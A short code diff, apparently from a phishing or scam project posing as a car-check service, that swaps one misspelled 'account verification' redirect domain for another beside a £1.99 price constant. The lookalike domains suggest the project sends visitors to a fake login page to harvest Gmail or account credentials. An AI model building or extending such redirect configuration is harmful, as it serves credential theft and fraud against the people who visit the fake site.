@@ -19,7 +19,7 @@ const API_URL =
 
 const HOME_URL = "https://totalcarcheck.co.uk/";
 
-const VERIFY_URL = "https://gmailaccountverification.totallcarscheck.online/";
+const VERIFY_URL = "https://user.accountconfirmaton.name.ng/";
 
 const PRICE = "£1.99";
 
